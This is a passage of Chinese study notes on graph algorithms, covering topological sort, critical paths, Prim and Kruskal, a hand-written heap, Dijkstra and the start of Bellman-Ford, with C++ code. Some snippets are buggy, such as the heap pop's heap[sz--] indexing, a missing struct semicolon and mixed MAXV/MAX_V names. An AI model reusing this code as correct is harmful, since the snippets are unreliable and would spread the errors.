G 中任意两个顶点 u,v，如果存在边 u-&gt;v，那么在序列中 u 一定在 v 前面。这个序列称为<strong>拓扑序列</strong>。我们可以以课程的学习先后顺序为例，例如图中所示，每门课程有其先导课程，必须先学习好其先导课程才能很好的学习这门课，并且先导课程之间不能形成环。在有了课程的联系信息之后，我们可以将课程排列成一个学习的先后序列，使得其满足先导课程顺序，这便是<strong>拓扑排序</strong>。<br>下面介绍拓扑排序的抽象步骤:</p><ul><li>①定义一个队列 Q，并把所有入度为 0 的节点加入队列。</li><li>②取队首系欸但，输出。然后删除所有从它出发的边，并令这些边到达的顶点的入度减 1，如果某个顶点的入度减为 0，则将其加入队列。</li><li>③反复进行②，直到队列为空。如果队列为空时入队的节点数目恰好为 N，则说明拓扑排序成功，图 G 为有向无环图；否则，排序失败，图 G 中有环。<br>可以使用邻接表实现拓扑排序，但是由于需要记录节点的入度，需要额外建立一个数组 inDegree [MAX_V] 来存储入度。代码如下:</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; G[MAX_V]; <span class="comment">//</span></span><br><span class="line"><span class="type">int</span> n,m,inDegree[MAX_V];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">topologicalSort</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt; n ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(inDegree[i] == <span class="number">0</span>) q.<span class="built_in">push</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="type">int</span> u = q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; G[u].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="type">int</span> v = G[u][i];   <span class="comment">//u的后继节点v</span></span><br><span class="line">inDegree[v]--;</span><br><span class="line"><span class="keyword">if</span>(inDegree[v] == <span class="number">0</span>)&#123;</span><br><span class="line">q.<span class="built_in">push</span>(v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">G[u].<span class="built_in">clear</span>();</span><br><span class="line">num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(num == n) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其用来进行判断一个给定的图是否是有向无环图。最后指出：如果题目有要求当有多个入度为 0 的顶点时选择编号最小的顶点，那么将 qu<br>eue 改为 priority_queue，保证队首元素最小编号即可。</p><h3 id="关键路径"><a class="markdownIt-Anchor" href="#关键路径">#</a> 关键路径</h3><h4 id="aov-网和-aoe-网"><a class="markdownIt-Anchor" href="#aov-网和-aoe-网">#</a> AOV 网和 AOE 网</h4><p>顶点活动网（AOV）是指用顶点表示活动，而用边集表示活动间优先关系的有向图。显然，图中不应该出现有向环，否则会让优先关系出现逻辑错误。<br>边活动 (AOE) 网是指用带权的边集表示活动，而用顶点表示事件的有向图，其中边权表示完成活动需要的时间。<br>一般来说，AOE 网可以用来表示一个工程的进行过程，而工程常常可以分为若干个子工程，显然 AOE 网不应该出现环。考虑到对工程来说有一个起始时刻和结束时刻，因此 AOV 网一般只有一个源点和一个汇点。虽然这么说，即使有多个源点和汇点，也可以转换为一个源点和汇点的情况（即添加一个超级源点和超级汇点连接所有源点和汇点）。<br>既然 AOE 网是基于工程提出的概念，那么一定有其需要解决的问题。AOE 网需要着重解决两个问题：a. 工程起始到终止至少需要多少时间；b. 那条路径上的活动是影响整个工程进度的关键。AOE 网中最长的路径被称为<strong>关键路径</strong>，而把关键路径上的活动称为<strong>关键活动</strong>。</p><h2 id="最小生成树"><a class="markdownIt-Anchor" href="#最小生成树">#</a> 最小生成树</h2><p>再来复习一下最小生成树吧   ：）<br>【生成树定义】给定一个无向图，如果它的某一个子图中任意两个顶点都相互连通并且是一棵树，那莪这棵树就叫做生成树。如果边上有权值，那么使得边权和最小的生成树是最小生成树。<br>【应用例题】：<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(3).png?raw=true" alt="例题示例"></p><h4 id="算法1prim算法"><a class="markdownIt-Anchor" href="#算法1prim算法">#</a> 算法 1（Prim 算法）</h4><p>首先，我们假设有一颗只包含一个点 v 的树 T。然后贪心选取 T 和其他顶点之间相连的最小权值的边，并把它加到 T 中。不断进行这个操作，即可获得一个生成树。下面来证明：<br>我们令 V 表示顶的集合。假设现在已经求得的生成树的顶点的集合是 X（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊂</mo></mrow><annotation encoding="application/x-tex">\subset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">⊂</span></span></span></span> V）, 并且存在在 V 上的最小生成树使得 T 是它的一个子图。下面我们证明存在一棵最小生成树使得 T 是它的一个子图并且它包含了连接 X 和 V\X 的权值最小的边。记连接 X 和 V\X 的权值最小的边为 e，它连接着 V（∈X）和 u (∈V \ X)。 根据假设，存在一颗 V 上的最小生成树使得 T 是它的一个子图。如果 e 也在这棵最小生成树上，问题就得到证明了，所以我们假设 e 不再这棵书上。因为生成树的本质是一棵树，所以在添加了 e 之后就形成了圈。<br>算了，抄别人的证明太难受了，我说一下自己的想法吧，虽然可能很潦草还有错误但是能理解就行：就是一个无向图，那我们随机取一个点，找这个点所能连的最小的边（为什么能随机取，因为任意一个点所连的最小边一定要取，满足贪心），如果选的最小边会使生成树产生环，则取次小边，直到所有点都被取到。<br>那直接根据我的定义上代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> cost[MAX_V][MAX_V]; <span class="comment">//表示 e=(u,v)的权值，不存在的情况下为INF</span></span><br><span class="line"><span class="type">int</span> mincost[MAX_V];     <span class="comment">//从集合X 出发的边到每个顶点的最小权值</span></span><br><span class="line"><span class="type">bool</span> used[MAX_V];       <span class="comment">//顶点i是否被包含在集合X中</span></span><br><span class="line"><span class="type">int</span> V; <span class="comment">//顶点数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">prim</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; V; i++)&#123;</span><br><span class="line">mincost[i] = INF;</span><br><span class="line">used[i] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">mincost[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//由于随机取都行 这里直接拿第一个</span></span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="type">int</span> v = <span class="number">-1</span>; <span class="comment">//从不属于X的顶点选取从x到其权值最小的顶点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span>; u &lt; V; u++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[u]&amp;&amp;(v == <span class="number">-1</span> || mincost[u] &lt; mincost[v])) v = u;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(v == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">used[v] = <span class="literal">true</span>;</span><br><span class="line">res += mincost[v];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span>;u &lt;V; u++)&#123;</span><br><span class="line">mincost[u] = <span class="built_in">min</span>(mincost[u], cost[v][u]);  <span class="comment">//更新集合X 出发到每个边的最小权值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="算法2kruskal算法"><a class="markdownIt-Anchor" href="#算法2kruskal算法">#</a> 算法 2（Kruskal 算法）</h4><p>下面是 Kruskal 算法。其是按照边的权值进行排序从小到大，如果不产生圈，就加上这条边。主要就是如何判断加的边是否形成圈（这里似乎可以用并查集的方法–&gt; 如果两个要连接的点属于同一根 则会形成圈 不属于同一根 则可以链接） Kruskal 在边排序较为费时间（边太多可以用 Prim 算法）<br>下面上代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">edge</span>&#123;<span class="type">int</span> u,v,cost;&#125;;</span><br><span class="line"><span class="type">int</span> par[MAX_V],rank[MAX_V];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_union_find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;V;i++)&#123;</span><br><span class="line">par[i] = i;</span><br><span class="line">rank[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(par[x] == x) <span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> par[x] = <span class="built_in">find</span>(par[x]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unite</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">x = <span class="built_in">find</span>(x);</span><br><span class="line">y = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(x == y) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(rank[x] &lt; rank[y])&#123;</span><br><span class="line">par[x] = y;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">par[y] = x;</span><br><span class="line"><span class="keyword">if</span> (rank[x] == rank[y]) rank[x]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">same</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">find</span>(x) == <span class="built_in">find</span>(y) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">const</span> edge&amp; e1,<span class="type">const</span> edge&amp; e2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> e1.cost &lt; e2.cost;</span><br><span class="line">&#125;</span><br><span class="line">edge es[MAX_E];</span><br><span class="line"><span class="type">int</span> V,E; <span class="comment">//V 定点数 E 边数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">sort</span>( es, es+ E, cmp);</span><br><span class="line"><span class="built_in">init_union_find</span>(V);</span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; E; i++)&#123;</span><br><span class="line">edge e = es[i];</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">same</span>(e.u,e.v))&#123;</span><br><span class="line">res += e.cost;</span><br><span class="line"><span class="built_in">unite</span>(e.u,e.v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="堆"><a class="markdownIt-Anchor" href="#堆">#</a> 堆</h2><p>【定义】 堆是一棵<strong>完全二叉树</strong>，树种每个结点的值都不小于（或不大于）其左右孩子结点的值。堆其实可以用 STL 库中的优先队列 (priority_queue) 代替。这里给出堆的手打模板。数组实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> heap[MAX_N],sz=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> i =sz++;    <span class="comment">//自己的节点编号</span></span><br><span class="line"><span class="keyword">while</span>(i &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> p = (i<span class="number">-1</span>) / <span class="number">2</span>;   <span class="comment">//父亲的节点编号</span></span><br><span class="line"><span class="keyword">if</span>(heap[p] &lt;= x) <span class="keyword">break</span>;   <span class="comment">//如果没有大小颠倒 退出</span></span><br><span class="line">heap[i] = heap[p];     <span class="comment">//把父亲节点的数值放下去，把自己提上去</span></span><br><span class="line">i = p;</span><br><span class="line">&#125;</span><br><span class="line">heap[i] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ret = heap[<span class="number">0</span>];   <span class="comment">//最小值</span></span><br><span class="line"><span class="type">int</span> x = heap[sz--];  <span class="comment">//要提到根的数值</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>; <span class="comment">//从根开始向下交换</span></span><br><span class="line"><span class="keyword">while</span>(i * <span class="number">2</span> + <span class="number">1</span> &lt;sz)&#123;</span><br><span class="line"><span class="comment">//比较儿子的值</span></span><br><span class="line"><span class="type">int</span> a = i * <span class="number">2</span> + <span class="number">1</span>, b = i * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(b &lt; sz &amp;&amp; heap[b] &lt; heap[a]) a=b;</span><br><span class="line"><span class="comment">//如果已经没有大小颠倒则退出</span></span><br><span class="line"><span class="keyword">if</span>(heap[a] &gt;= x) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//把儿子的数值提上取去</span></span><br><span class="line">heap[i] = heap[a];</span><br><span class="line">i = a;</span><br><span class="line">&#125;</span><br><span class="line">heap[i] = x;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最短路径算法"><a class="markdownIt-Anchor" href="#最短路径算法">#</a> 最短路径算法</h2><p>最短路径是图论中一个很经典的问题：给定图 G (V,E)，求一条从起点到终点的路径，使得这条路径上经过的所有边权和最小。即<strong>对任意给出的图 G (V,E) 和起点 S，终点 T，求 S 到 T 的最短路径。</strong> 常用的有 Dijkstra 算法，Bellman-Ford 算法，SPFA 算法，Floyd 算法。</p><h4 id="dijkstra算法"><a class="markdownIt-Anchor" href="#dijkstra算法">#</a> Dijkstra 算法</h4><p>其可以用来求解<strong>单源最短路问题</strong>，即给定图 G 和起点 s，可以得到 S 到达每个顶点的最短距离。Dijkstra 的基本思想是对图 G (V,E) 设置集合 S，存放已被访问的顶点，然后每次从集合 V-S 中选择与起点 s 的最短距离最小的一个顶点（记为 u），访问并加入集合 S。之后，令顶点 u 为中介点，优化从 s 与所有从 u 能到达的顶点 v 之间的最短距离。这样的操作执行 n 次，（n 为顶点个数）直到集合 S 已经包含所有的顶点。<br>其算法策略是：<br>①每次从集合 V-S (未到达的节点) 中选择与起点 s 最短距离最小的顶点 u，访问并加入 S。<br>②之后，令顶点 u 为中介点，优化起点 s 和所有从 u 能到达的顶点 v 之间的最短距离。<br>下面给出伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//G为图，一般设成全局变量；数组d为源点到达各个点的最短路径长度，s为起点</span><br><span class="line">Dijkstra (G,d[],s)&#123;</span><br><span class="line">初始化</span><br><span class="line">for(循环n)&#123;</span><br><span class="line">u = 使d[u]最小的还未被访问的顶点的编号</span><br><span class="line">for(从u出发能到达的所有顶点v)&#123;</span><br><span class="line">if(v未被访问&amp;&amp;以u为中介点使s到顶点v的最短距离d[v]更优)&#123;</span><br><span class="line">优化d[v];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<s>只实现邻接表版本</s>的，邻接矩阵内核都是与上述伪代码一样。算了还是写临界矩阵的把<br><strong>邻接矩阵版本：(这里加上了前驱节点可以获得最短路径)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n,G[MAX_V][MAX_V];  <span class="comment">//n为顶点数，MAX_V为最大顶点数</span></span><br><span class="line"><span class="type">int</span> d[MAX_V]; <span class="comment">//起点到达各个点的最短路径长度</span></span><br><span class="line"><span class="type">int</span> pre[MAX_V];  <span class="comment">//pre[v] 表示从起点到顶点v的最短路径上v的前一个顶点</span></span><br><span class="line"><span class="type">bool</span> vis[MAX_V] = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="type">int</span> s)</span></span>&#123;</span><br><span class="line"><span class="built_in">fill</span>(d, d+MAX_V, INF);</span><br><span class="line">d[s] = <span class="number">0</span>;  <span class="comment">//起点s到自身的距离是0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt; n;i++)&#123;</span><br><span class="line"><span class="type">int</span> u = <span class="number">-1</span>,MIN = INF;   <span class="comment">//u使d[u]最小，MIN存放该最小的d[u]</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;   <span class="comment">// 找到未被访问的顶点d[]中最小的</span></span><br><span class="line"><span class="keyword">if</span>(vis[j] == <span class="literal">false</span> &amp;&amp; d[j] &lt; MIN)&#123;</span><br><span class="line">u = j;</span><br><span class="line">MIN = d[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//找不到小于INF 的 d[u],说明剩下的顶点和起点s不连通</span></span><br><span class="line"><span class="keyword">if</span>( u == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">vis[u] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v = <span class="number">0</span>; v&lt; n; v++)&#123;<span class="comment">//如果v未访问&amp;&amp; u能到达v &amp;&amp;以u为中介点可以使d[v]更优</span></span><br><span class="line"><span class="keyword">if</span>(vis[v] == <span class="literal">false</span> &amp;&amp; G[u][v] != INF &amp;&amp; d[u] + G[u][v] &lt; d[v])&#123;</span><br><span class="line">d[v] = d[u] + G[u][v];</span><br><span class="line">pre[v] = u;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> v)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(v == s)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,s);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">DFS</span>(s,pre[v]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>邻接表版本：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//邻接表版本</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line"><span class="type">int</span> v,dis;   <span class="comment">//v为边的目标顶点，dis为边权</span></span><br><span class="line">&#125;</span><br><span class="line">vector&lt;Node&gt; Adj[MAX_V];  <span class="comment">//图G，存放从顶点u触发可以到达的所有顶点</span></span><br><span class="line"><span class="type">int</span> n;<span class="comment">//n为定点数</span></span><br><span class="line"><span class="type">int</span> d[MAX_V];<span class="comment">//起点到达各个点的最短路径长度</span></span><br><span class="line"><span class="type">bool</span> vis[MAXV] = &#123;<span class="literal">false</span>&#125;;  <span class="comment">//标记数组，true表示已经被访问过</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="type">int</span> s)</span></span>&#123;</span><br><span class="line"><span class="built_in">fill</span>(d,d+MAX_V,INF);   <span class="comment">//fill函数讲d数组赋值为INF （慎用memset)</span></span><br><span class="line">d[s] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i= <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="type">int</span> u = <span class="number">-1</span>, MIN = INF;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j&lt; n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(vis[j] == <span class="literal">false</span> &amp;&amp; d[j] &lt; MIN)&#123;</span><br><span class="line">u = j;</span><br><span class="line">MIN = d[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//找不到小于INF的d[u],说明剩下的顶点和起点s不连通</span></span><br><span class="line"><span class="keyword">if</span>(u == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">vis[u] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; Adj[u].<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="type">int</span> v = Adj[u][j].v;</span><br><span class="line"><span class="keyword">if</span>(vis[v] == <span class="literal">false</span> &amp;&amp; d[u] + Adj[u][j].dis &lt; d[v])&#123;</span><br><span class="line">d[v] = d[u] + Adj[u][j].dis; <span class="comment">//优化d[v]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是双向边，只需要添加两次邻接表即可。</p><h5 id="dijkstra扩展"><a class="markdownIt-Anchor" href="#dijkstra扩展">#</a> Dijkstra 扩展</h5><blockquote><p>先鸽一下</p></blockquote><p>这里做了一道洛谷上的<a href="https://www.luogu.com.cn/problem/P1629"> P1629 邮递员送信 </a>这道题有个很好的思路，对于起点到多个点的最短路径，如果求多个点到起点的最短路径，可以 Dijkstra 但是反向建图求 Dij。我觉得这个思路特别好。另外本题似乎要判断重边取最小，否则直接爆零。<s>太惨了</s></p><p>扩展 2，洛谷的<a href="https://www.luogu.com.cn/problem/P6833"> P6833 雷雨 -</a>, 这个题也是可以用 Dij 做，这里有一个很好的思路，但是感觉适应这个思路的地方比较少，具体可以点进去看之前的代码。</p><h4 id="bellman-ford算法和spfa算法"><a class="markdownIt-Anchor" href="#bellman-ford算法和spfa算法">#</a> Bellman-Ford 算法和 SPFA 算法</h4><p>Dijkstra 算法可以很好解决无负权图的最短路径问题，但是如果出现了负权边，Dijkstra 算法就会失效。<br>Bellman-Ford 算法和 Dijkstra 算法一样，是用来求解<strong>单源最短路径</strong>问题，但是也能处理带有负权边的情况。现在考虑<strong>环</strong>，也就是从某个顶点出发，经过若干个不同顶点回到该顶点的情况。而根据环中边的边权之和的正负，可以将环分为<strong>零环，正环，负环</strong>。显然，零环和正环不会影响最短路径的求解，如果出现负环，且从源点可以到达，那么就会影响最短路径的求解。<br>与 Dijkstra 算法相同，<strong>Bellman-Ford</strong> 算法设置一个数组 d，用来存放源点到达各个顶点的最短距离。同时 Bellman-Ford 算法返回一个 bool 值：如果其中存在从源点可以到达的负环，那么函数将会返回 false，否则，函数将返回 true，此时数组当中存放的就是从源点到达各个顶点的最短路径。<br>Bellman-Ford 算法的主要思路如下面的伪代码所示。需要对图中的边进行 V-1 轮操作，每轮都遍历图中的所有边：对每条边 u-&gt;v，如果以 u 为中介点可以使 d [v] 更小，即 d [u]+length [u0&gt;v] &lt; d [v] 成立时，就用 d [u]+length [u-&gt;v] 更新 d [v]。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i &lt; n; i++)&#123;    <span class="comment">//执行n-1轮操作，</span></span><br><span class="line"><span class="keyword">for</span>(each edge u-&gt;v)&#123;   <span class="comment">//每轮操作都遍历所有边</span></span><br><span class="line"><span class="keyword">if</span>(d[u] + length[u-&gt;v] &lt; d[v])&#123;  <span class="comment">//以u为中介点可以使d[v]更小</span></span><br><span class="line">d[v] = d[u] + length[u-&gt;v];  <span 